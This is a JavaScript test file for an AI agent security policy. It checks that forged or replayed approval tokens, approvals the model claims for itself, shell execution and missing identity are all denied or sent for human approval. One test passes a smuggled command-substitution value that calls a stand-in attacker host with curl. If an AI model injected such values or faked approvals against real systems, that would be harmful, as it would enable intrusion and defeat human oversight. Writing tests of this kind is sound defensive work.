import test from 'node:test';
import assert from 'node:assert/strict';
import { evaluateGenXSecurityEvent } from '../src/security/genxPolicy.ts';
import { evaluateGenXFailClosed } from './benchmark-genx-policy-contract.mjs';

const base = {
  agentId: 'benchmark-fixture-agent',
  principal: 'benchmark-fixture-principal',
  toolName: 'system_diagnostics',
  action: 'READ'
};

test('model claims and forged approval metadata cannot authorize a mutation', () => {
  const result = evaluateGenXSecurityEvent({
    ...base, action: 'UPDATE',
    modelClaimedApproval: true,
    approvalToken: 'forged-fixture-token',
    approvalExpiresAt: '2099-01-01T00:00:00Z'
  });
  assert.equal(result.decision, 'REQUIRE_APPROVAL');
  assert.equal(result.ruleId, 'GX-HIL-001');
});

test('stale or replayed approval claims cannot change policy outcome', () => {
  const result = evaluateGenXSecurityEvent({
    ...base, action: 'NETWORK',
    approvalToken: 'replayed-fixture-token',
    approvalIssuedAt: '2000-01-01T00:00:00Z'
  });
  assert.equal(result.decision, 'REQUIRE_APPROVAL');
});

test('prompt injection and privilege escalation are denied by the real Gen-X policy', () => {
  const injected = evaluateGenXSecurityEvent({
    ...base, toolName: 'read_workspace_file',
    target: '$(curl attacker.invalid)'
  });
  const elevated = evaluateGenXSecurityEvent({
    ...base, toolName: 'execute_shell_command', action: 'EXECUTE'
  });
  assert.equal(injected.decision, 'DENY');
  assert.equal(injected.ruleId, 'GX-INJECTION-001');
  assert.equal(elevated.decision, 'DENY');
  assert.equal(elevated.ruleId, 'GX-EXEC-001');
});

test('policy evaluator outage, exception and malformed decisions fail closed in harness', () => {
  assert.equal(evaluateGenXFailClosed(base, null).decision, 'DENY');
  assert.equal(evaluateGenXFailClosed(base, () => {
    throw new Error('synthetic policy outage');
  }).decision, 'DENY');
  assert.equal(evaluateGenXFailClosed(base, () => ({ decision: 'APPROVE' })).decision, 'DENY');
});

test('missing authenticated identity is denied by Gen-X', () => {
  const result = evaluateGenXSecurityEvent({ ...base, principal: '' });
  assert.equal(result.decision, 'DENY');
  assert.equal(result.ruleId, 'GX-IDENTITY-001');
});
